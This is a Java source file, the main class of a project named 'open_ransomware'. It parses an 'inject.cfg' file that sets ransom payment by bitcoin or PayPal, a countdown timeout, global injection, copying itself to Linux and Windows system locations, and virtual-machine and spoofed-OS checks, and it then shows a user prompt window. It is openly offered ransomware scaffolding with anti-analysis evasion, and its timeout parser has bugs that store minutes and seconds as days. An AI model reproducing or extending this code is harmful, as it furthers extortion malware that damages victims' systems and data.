package com.bechris100.open_ransomware;

import com.bechris100.open_ransomware.config.ConfigException;
import com.bechris100.open_ransomware.config.ConfigParser;
import com.bechris100.open_ransomware.config.Configuration;
import com.bechris100.open_ransomware.utils.RuntimeEnvironment;
import com.bechris100.open_ransomware.windows.UserPromptWindow;

import java.io.FileNotFoundException;
import java.io.IOException;

public class MainClass {

    private static void applyTimeout(String val) {
        try {
            if (val.contains(",")) {
                String[] timeVal = val.split(",");
                for (String v : timeVal) {
                    if (v.contains("d")) {
                        v = v.replace("d", "");
                        SoftwareEnvironment.Timeout.timeoutDays = Integer.parseInt(v);
                    } else if (v.contains("h")) {
                        v = v.replace("h", "");
                        SoftwareEnvironment.Timeout.timeoutHours = Integer.parseInt(v);
                    } else if (v.contains("m")) {
                        v = v.replace("m", "");
                        SoftwareEnvironment.Timeout.timeoutDays = Integer.parseInt(v);
                    } else if (v.contains("s")) {
                        v = v.replace("s", "");
                        SoftwareEnvironment.Timeout.timeoutDays = Integer.parseInt(v);
                    }
                }
            } else {
                if (val.contains("d")) {
                    val = val.replace("d", "");
                    SoftwareEnvironment.Timeout.timeoutDays = Integer.parseInt(val);
                } else if (val.contains("h")) {
                    val = val.replace("h", "");
                    SoftwareEnvironment.Timeout.timeoutHours = Integer.parseInt(val);
                } else if (val.contains("m")) {
                    val = val.replace("m", "");
                    SoftwareEnvironment.Timeout.timeoutMinutes = Integer.parseInt(val);
                } else if (val.contains("s")) {
                    val = val.replace("s", "");
                    SoftwareEnvironment.Timeout.timeoutSeconds = Integer.parseInt(val);
                }
            }
        } catch (NumberFormatException e) {
            System.err.println("One of the values at \"" + val + "\" has been formatted wrong into a valid Integer value.");
            System.err.println("Software crashed with exit code 1");
            System.exit(1);
        }
    }

    private static void loadConfigurations() {
        try {
            ConfigParser.loadFromResource("res/inject.cfg");

            for (Configuration config : ConfigParser.list) {
                String na = config.name;
                String val = config.value;

                switch (na) {
                    /*
                    this is very much bloat, but this is used to parse every line of "inject.cfg" file
                     */
                    case "ConfigCopyOutLocation.Linux" -> SoftwareEnvironment.ConfigCopyOut.outLinux = val;
                    case "ConfigCopyOutLocation.Linux.Global" -> SoftwareEnvironment.ConfigCopyOut.outLinuxGlobal = val;
                    case "ConfigCopyOutLocation.Windows" -> SoftwareEnvironment.ConfigCopyOut.outWindows = val;
                    case "ConfigCopyOutLocation.Windows.Global" -> SoftwareEnvironment.ConfigCopyOut.outWindowsGlobal = val;

                    case "JavaVM_OSModificationDetectedMessage_OsName" -> SoftwareEnvironment.javaVmOsNameModified = val;
                    case "JavaVM_OSModificationDetectedMessage_OsArch" -> SoftwareEnvironment.javaVmOsArchModified = val;
                    case "JavaVM_OSModificationDetectedMessage_OsVersion" -> SoftwareEnvironment.javaVmOsVersionModified = val;

                    case "UserPrompt.Title" -> SoftwareEnvironment.UserPrompt.title = val;
                    case "UserPrompt.Message" -> SoftwareEnvironment.UserPrompt.message = val;

                    case "Timeout" -> applyTimeout(val);

                    case "JavaVM_OperatingSystemModifications" -> {
                        if (!(val.equals("true") || val.equals("false")))
                            throw new ConfigException("Configuration value \"" + val + "\" is not a valid Boolean");

                        SoftwareEnvironment.osValueModificationsEnabled = Boolean.parseBoolean(val);
                    }
                    case "GlobalInjection" -> {
                        if (!(val.equals("true") || val.equals("false")))
                            throw new ConfigException("Configuration value \"" + val + "\" is not a valid Boolean");

                        SoftwareEnvironment.globalInjection = Boolean.parseBoolean(val);
                    }
                    case "ConfigCopyOut" -> {
                        if (!(val.equals("true") || val.equals("false")))
                            throw new ConfigException("Configuration value \"" + val + "\" is not a valid Boolean");

                        SoftwareEnvironment.ConfigCopyOut.enabled = Boolean.parseBoolean(val);
                    }
                    case "UserPrompt" -> {
                        if (!(val.equals("true") || val.equals("false")))
                            throw new ConfigException("Configuration value \"" + val + "\" is not a valid Boolean");

                        SoftwareEnvironment.UserPrompt.enabled = Boolean.parseBoolean(val);
                    }
                    case "VirtualMachineCheck" -> {
                        if (!(val.equals("true") || val.equals("false")))
                            throw new ConfigException("Configuration value \"" + val + "\" is not a valid Boolean");

                        SoftwareEnvironment.virtualMachineCheck = Boolean.parseBoolean(val);
                    }

                    case "PreferredBilling" -> {
                        if (!(val.equalsIgnoreCase("bitcoin") || val.equals("paypal")))
                            throw new ConfigException("Configuration value \"" + val + "\" invalid. Must be either \"bitcoin\" or \"paypal\".");

                        if (val.equalsIgnoreCase("bitcoin"))
                            SoftwareEnvironment.Billing.preferredBilling = SoftwareEnvironment.Billing.BillingType.BITCOIN;
                        else if (val.equalsIgnoreCase("paypal"))
                            SoftwareEnvironment.Billing.preferredBilling = SoftwareEnvironment.Billing.BillingType.PAYPAL;
                    }

                    case "DisplayMessageFile" -> {
                        if (ResourceManager.class.getResource(val) == null)
                            throw new FileNotFoundException("Resource file at \"com.bechris100.open_ransomware." + val + "\" not found");

                        SoftwareEnvironment.messageFile = val;
                    }
                }
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public static void main(String[] args) {
        loadConfigurations();

        if (SoftwareEnvironment.osValueModificationsEnabled) {
            if (RuntimeEnvironment.countRuntimeModifications() >= 1) {
                if (RuntimeEnvironment.osNameModified())
                    System.err.println(SoftwareEnvironment.javaVmOsNameModified);

                if (RuntimeEnvironment.osArchModified())
                    System.err.println(SoftwareEnvironment.javaVmOsArchModified);

                if (RuntimeEnvironment.osVersionModified())
                    System.err.println(SoftwareEnvironment.javaVmOsVersionModified);

                System.err.println("Software crashed with exit value 1");
                System.exit(1);
            }
        }

        if (SoftwareEnvironment.UserPrompt.enabled)
            new UserPromptWindow();
    }

}
